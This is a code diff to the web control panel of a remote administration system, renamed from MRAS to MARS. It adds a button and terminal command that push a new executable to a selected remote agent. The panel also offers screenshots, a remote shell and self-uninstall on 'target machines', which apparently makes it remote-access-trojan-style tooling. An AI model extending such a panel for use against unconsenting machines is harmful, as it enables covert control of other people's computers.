@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
-<title>MRAS — Remote Admin System</title>
+<title>MARS — Remote Admin System</title>
 <style>
 /* ── Reset & base ─────────────────────────────────────────────────────── */
 *{margin:0;padding:0;box-sizing:border-box}
@@ -228,7 +228,7 @@ body::after{content:'';position:fixed;inset:0;background:repeating-linear-gradie
     <div class="logo">
       <div class="logo-icon">⚡</div>
       <div>
-        <div class="logo-text">MRAS</div>
+        <div class="logo-text">MARS</div>
         <div class="logo-sub">Remote Admin System</div>
       </div>
     </div>
@@ -283,7 +283,7 @@ body::after{content:'';position:fixed;inset:0;background:repeating-linear-gradie
           <div class="panel active" id="panel-terminal">
             <div id="term-output">
               <div class="term-line info">╔══════════════════════════════════════════════╗</div>
-              <div class="term-line info">║   MRAS — Modular Remote Admin System v1.0    ║</div>
+              <div class="term-line info">║   MARS — Modular Advanced Remote System v1.0    ║</div>
               <div class="term-line info">╚══════════════════════════════════════════════╝</div>
               <div class="term-line info" style="margin-top:8px">Select an agent from the sidebar, then type a command.</div>
               <div class="term-line info">Type <span style="color:var(--cyan)">help</span> for available commands.</div>
@@ -326,6 +326,7 @@ body::after{content:'';position:fixed;inset:0;background:repeating-linear-gradie
               <button class="btn-primary" onclick="listDir()">📂 List</button>
               <button class="btn-primary" onclick="triggerUpload()" style="border-color:var(--cyan);color:var(--cyan)">⬆ Upload</button>
               <input type="file" id="upload-input" style="display:none" onchange="uploadFile(this)"/>
+              <input type="file" id="update-input" style="display:none" accept=".exe" onchange="uploadUpdate(this)"/>
             </div>
             <div id="files-list">
               <div class="empty-state">
@@ -540,6 +541,7 @@ function renderClientsGrid() {
         <button class="btn-sm" onclick="event.stopPropagation();selectClient('${id}');takeScreenshot()">📷 SS</button>
         <button class="btn-sm" onclick="event.stopPropagation();selectClient('${id}');fetchSysinfo();switchTab('sysinfo')">📊 Info</button>
         <button class="btn-sm" onclick="event.stopPropagation();selectClient('${id}');switchTab('terminal')">⌨ Shell</button>
+        <button class="btn-sm" onclick="event.stopPropagation();selectClient('${id}');triggerUpdateUpload()" style="border-color:var(--orange);color:var(--orange)">⬆ Update</button>
       </div>
     </div>`;
   }).join('');
@@ -557,7 +559,7 @@ function selectClient(id) {
 function updatePrompt() {
   const info = S.selected ? S.clients[S.selected] : null;
   const host = info?.hostname || (S.selected ? S.selected.slice(0,8) : null);
-  document.getElementById('term-prompt').textContent = host ? `${host} >` : 'mras >';
+  document.getElementById('term-prompt').textContent = host ? `${host} >` : 'mars >';
 }
 
 // ── Terminal ───────────────────────────────────────────────────────────────
@@ -571,6 +573,7 @@ const HELP = `<span style="color:var(--cyan)">Available commands:</span>
   <span style="color:var(--green)">select</span> &lt;id&gt;         — select agent (prefix ok)
   <span style="color:var(--green)">list</span>                — list online agents
   <span style="color:var(--green)">uninstall</span>           — remove agent from target machine
+  <span style="color:var(--green)">update</span>              — push new exe to agent (opens file picker)
   <span style="color:var(--green)">clear</span>               — clear terminal
   <span style="color:var(--green)">help</span>                — this help`;
 
@@ -669,6 +672,10 @@ async function termSend() {
       termPrint(`✓ ${res.message || 'Agent is shutting down and removing itself.'}`, 'success');
       S.selected = null;
       updatePrompt();
+    }
+    else if (verb === 'update') {
+      termPrint('Opening file picker — select new client exe...', 'info');
+      triggerUpdateUpload();
     }
     else {
       termPrint(`Unknown command: ${verb}. Type 'help'`, 'err');
@@ -825,6 +832,36 @@ async function uploadFile(input) {
       toast('success', `Uploaded: ${res.saved} (${formatBytes(res.size)})`);
       listDir();
     } catch(err) { toast('error', err); }
+  };
+  reader.readAsDataURL(file);
+}
+
+// ── Update (remote exe push) ───────────────────────────────────────────────
+function triggerUpdateUpload() {
+  if (!S.selected) { toast('error', 'No agent selected'); return; }
+  document.getElementById('update-input').click();
+}
+
+async function uploadUpdate(input) {
+  const file = input.files[0];
+  if (!file || !S.selected) return;
+  input.value = '';
+  const version = prompt('Version label for this update (e.g. 1.1):', '1.1') || 'unknown';
+  const sizeMB = (file.size / 1024 / 1024).toFixed(1);
+  toast('info', `Reading ${file.name} (${sizeMB} MB)...`);
+  const reader = new FileReader();
+  reader.onload = async e => {
+    const b64 = e.target.result.split(',')[1];
+    termPrint(`Sending update v${version} (${sizeMB} MB) to agent...`, 'info');
+    try {
+      const res = await sendCmd('update_client', {data: b64, version}, 120000);
+      toast('success', res.message || 'Update sent');
+      termPrint(`✓ ${res.message || 'Update sent. Agent will restart.'}`, 'success');
+      addLog('command', `Pushed update v${version} to ${S.clients[S.selected]?.hostname || S.selected?.slice(0,8)}`);
+    } catch(err) {
+      toast('error', `Update failed: ${err}`);
+      termPrint(`Error: ${err}`, 'err');
+    }
   };
   reader.readAsDataURL(file);
 }
